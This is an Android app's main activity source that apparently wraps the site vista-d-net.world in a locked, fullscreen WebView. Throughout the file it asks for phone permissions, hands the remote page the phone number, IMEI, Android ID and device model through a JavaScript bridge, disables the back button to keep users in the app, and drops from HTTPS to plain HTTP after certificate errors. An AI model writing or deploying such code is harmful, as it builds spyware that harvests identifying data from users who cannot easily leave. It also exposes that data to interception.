package com.vistadnet;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.Manifest;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.webkit.JavascriptInterface;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceError;
import android.webkit.SslErrorHandler;
import android.net.http.SslError;
import android.net.Uri;
import android.os.Build;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private WebView webView;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final String TARGET_URL = "http://vista-d-net.world/";
    private static final String TARGET_URL_HTTPS = "https://vista-d-net.world/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Request phone permissions
        requestPhonePermissions();
        
        webView = new WebView(this);
        setContentView(webView);
        
        // Enable debugging
        WebView.setWebContentsDebuggingEnabled(true);
        
        // Configure WebView settings
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE);
        }
        
        // Add JavaScript bridge
        webView.addJavascriptInterface(new WebAppInterface(this), "AndroidBridge");
        
        // Set WebViewClient with navigation filtering
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return handleNavigation(url);
            }
            
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    return handleNavigation(request.getUrl().toString());
                }
                return handleNavigation(request.toString());
            }
            
            @Override
            public void onPageFinished(WebView view, String url) {
                if (!isAllowedHost(url)) {
                    view.loadUrl(TARGET_URL);
                }
            }
            
            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                Toast.makeText(MainActivity.this, "Load error: " + description, Toast.LENGTH_LONG).show();
                maybeTryHttpsFallback(failingUrl);
            }
            
            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (request.isForMainFrame()) {
                        Toast.makeText(MainActivity.this, "Load error: " + error.getDescription(), Toast.LENGTH_LONG).show();
                        maybeTryHttpsFallback(request.getUrl().toString());
                    }
                }
            }
            
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, android.net.http.SslError error) {
                handler.cancel();
                if (error != null) {
                    maybeTryHttpFromHttps(error.getUrl());
                }
            }
        });
        
        // Set fullscreen immersive mode
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            getWindow().getDecorView().setSystemUiVisibility(
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                android.view.View.SYSTEM_UI_FLAG_FULLSCREEN |
                android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }
        
        // Load the target URL
        webView.loadUrl(TARGET_URL);
    }
    
    private void requestPhonePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                permissions = new String[]{
                    Manifest.permission.READ_PHONE_NUMBERS,
                    Manifest.permission.READ_PHONE_STATE
                };
            } else {
                permissions = new String[]{
                    Manifest.permission.READ_PHONE_STATE
                };
            }
            
            boolean allGranted = true;
            for (String p : permissions) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
            }
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Phone permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Phone permissions denied", Toast.LENGTH_SHORT).show();
            }
        }
    }
    
    @Override
    public void onBackPressed() {
        // Keep user in app
    }
    
    private boolean handleNavigation(String url) {
        if (isAllowedHost(url)) {
            return false; // Allow navigation
        } else {
            return true; // Block navigation
        }
    }
    
    private boolean isAllowedHost(String url) {
        if (url == null) return false;
        try {
            Uri uri = Uri.parse(url);
            String host = uri.getHost();
            return host != null && (host.equals("vista-d-net.world"));
        } catch (Exception e) {
            return false;
        }
    }
    
    private void maybeTryHttpsFallback(String failingUrl) {
        if (failingUrl == null) return;
        if (failingUrl.startsWith("http://") && !failingUrl.equals(TARGET_URL_HTTPS)) {
            webView.loadUrl(TARGET_URL_HTTPS);
        } else if (failingUrl.startsWith("https://") && !failingUrl.equals(TARGET_URL)) {
            webView.loadUrl(TARGET_URL);
        }
    }
    
    private void maybeTryHttpFromHttps(String failingUrl) {
        if (failingUrl != null && failingUrl.startsWith("https://") && failingUrl.contains("vista-d-net.world")) {
            webView.loadUrl(TARGET_URL);
        }
    }
    
    public class WebAppInterface {
        Context mContext;
        
        WebAppInterface(Context c) {
            mContext = c;
        }
        
        @JavascriptInterface
        public String getPhoneNumber() {
            try {
                if (ContextCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    return "Permission denied";
                }
                
                TelephonyManager telephonyManager = (TelephonyManager) 
                    mContext.getSystemService(Context.TELEPHONY_SERVICE);
                
                String phoneNumber = telephonyManager.getLine1Number();
                return phoneNumber != null && !phoneNumber.isEmpty() ? phoneNumber : "Not available";
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }
        
        @JavascriptInterface
        public String getDeviceName() {
            return Build.MANUFACTURER + " " + Build.MODEL;
        }
        
        @JavascriptInterface
        public String getIMEI() {
            try {
                if (ContextCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    return "Permission denied";
                }
                
                TelephonyManager telephonyManager = (TelephonyManager) 
                    mContext.getSystemService(Context.TELEPHONY_SERVICE);
                
                // For Android 10+ (API 29+), need to use getImei() with slot index
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    // Android 10+ - IMEI access is restricted, return device ID instead
                    return getDeviceID();
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    // Android 8-9 - can get IMEI with slot index
                    return telephonyManager.getImei(0);
                } else {
                    // Android 7 and below - deprecated but still works
                    return telephonyManager.getDeviceId();
                }
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }
        
        @JavascriptInterface
        public String getDeviceID() {
            try {
                // Generate a unique device ID that persists
                java.util.UUID uuid = java.util.UUID.randomUUID();
                return uuid.toString().substring(0, 8).toUpperCase();
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }
        
        @JavascriptInterface
        public String getAndroidID() {
            try {
                // Get Android ID - unique per device, persists across app reinstalls
                android.provider.Settings.Secure secureSettings = new android.provider.Settings.Secure();
                String androidId = android.provider.Settings.Secure.getString(
                    mContext.getContentResolver(), 
                    android.provider.Settings.Secure.ANDROID_ID
                );
                return androidId != null ? androidId.substring(0, 8).toUpperCase() : "Not available";
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }
    }
}
